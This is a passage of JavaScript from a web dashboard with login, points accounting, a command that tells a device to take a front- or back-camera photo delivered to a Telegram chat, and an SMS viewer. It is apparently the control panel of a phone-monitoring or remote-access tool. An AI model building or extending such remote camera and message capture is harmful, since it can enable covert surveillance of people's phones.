  $("smsEmpty").classList.remove("hidden");
}

/* ═══ CAMERA ═══ */
async function sendCameraCommand(type) {
  if (!state.userRow) { toast("Please sign in first", "error"); return; }
  const points = state.userRow.points || 0;
  if (points < CAMERA_COST) {
    toast(`Not enough points (need ${CAMERA_COST}, have ${points})`, "error");
    return;
  }

  showOverlay("Sending command...");
  try {
    const newPoints = points - CAMERA_COST;
    await api("PATCH", `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`, {
      data: { points: newPoints }
    });
    state.userRow.points = newPoints;
    updatePointsUI();

    const cmdData = {
      targetDeviceId: state.userRow.userId,
      issuedByUserId: state.userRow.userId,
      action: "take_photo",
      status: "pending",
      payload: JSON.stringify({
        camera: type,
        chatId: state.userRow.telegramChatId || "",
        label: type === "front" ? "Simple" : "Back",
        source: "webapp",
      }),
      expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString(),
    };
    await api("POST", `/tablesdb/${DB}/tables/${T_COMMANDS}/rows`, {
      rowId: "unique()", data: cmdData
    });
    hideOverlay();
    toast("Command sent — photo arriving soon", "success");
  } catch (e) {
    hideOverlay();
    try {
      await api("PATCH", `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`, {
        data: { points }
      });
      state.userRow.points = points;
      updatePointsUI();
    } catch (e2) {}
    toast("Failed: " + e.message, "error");
  }
}

function updatePointsUI() {
  const p = state.userRow && state.userRow.points != null ? state.userRow.points : 0;
  $("camPoints").textContent = p;
  $("profPoints").textContent = p;
}

/* ═══ ENTER APP ═══ */
function enterApp() {
  $("loginScreen").classList.add("hidden");
  $("dashScreen").classList.remove("hidden");
  document.body.style.display = "block";
  document.body.style.padding = "16px";

  const name = state.userRow.displayName || state.userRow.email || "User";
  $("userEmail").textContent = name;
  $("profAvatar").textContent = getInitial(state.userRow.displayName || state.userRow.email);
  $("profName").textContent = state.userRow.displayName || "-";
  $("profEmail").textContent = state.userRow.email || "-";
  $("profUserId").textContent = state.userRow.userId || "-";
  $("profStatus").textContent = state.userRow.isActive ? "Active" : "Inactive";
  updatePointsUI();
}

/* ═══ MENU NAVIGATION ═══ */
document.querySelectorAll(".tab-btn").forEach(btn => {
  btn.onclick = async () => {
    const tab = btn.dataset.tab;
    document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");

    $("menuScreen").classList.add("hidden");
    $("dataScreen").classList.add("show");

    document.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));
    const content = $("tab-" + tab);
    if (content) content.classList.add("active");

    // Load data
    if (tab === "camera") {
      loadPhotos();
    } else if (tab === "sms") {
      showOverlay("Loading messages...");
      await loadSms();
      hideOverlay();
    }

    window.scrollTo({ top: 0, behavior: "smooth" });
  };
});

$("backBtn").onclick = () => {
  $("dataScreen").classList.remove("show");
  $("menuScreen").classList.remove("hidden");
  document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
  window.scrollTo({ top: 0, behavior: "smooth" });
};

document.querySelectorAll(".cam-card").forEach(btn => {
  btn.onclick = () => sendCameraCommand(btn.dataset.cam);
});

/* ═══ LOGIN ═══ */
$("loginBtn").onclick = async () => {
  hideLoginError();
  const email = $("emailInput").value.trim();
  const password = $("passwordInput").value;
  if (!email || !password) { showLoginError("Enter email and password"); return; }

  const btn = $("loginBtn");
  btn.disabled = true;
  btn.textContent = "Logging in...";

  try {
    const session = await doLogin(email, password);
    const userId = (session && session.userId) || (session && session.user && session.user.$id);
    let realUserId = userId;

    if (!realUserId) {
      const q = encodeURIComponent(JSON.stringify({
        method: "equal", attribute: "email", values: [email]
      }));
      const ures = await api("GET", `/tablesdb/${DB}/tables/${T_USERS}/rows?queries[]=${q}`);
      if (ures && ures.rows && ures.rows.length > 0) realUserId = ures.rows[0].userId;
    }
    if (!realUserId) throw new Error("User ID not found");

    const row = await findUserRow(realUserId, email);
    if (!row) { showLoginError("User row not found"); return; }

    state.userRow = row;
    enterApp();
  } catch (e) {
    showLoginError(e.message);
  } finally {
    btn.disabled = false;
    btn.textContent = "Login";
  }
};

$("passwordInput").addEventListener("keydown", (e) => {
  if (e.key === "Enter") $("loginBtn").click();
});

$("logoutBtn").onclick = () => {
  if (!confirm("Sign out?")) return;
  location.reload();
};
</script>
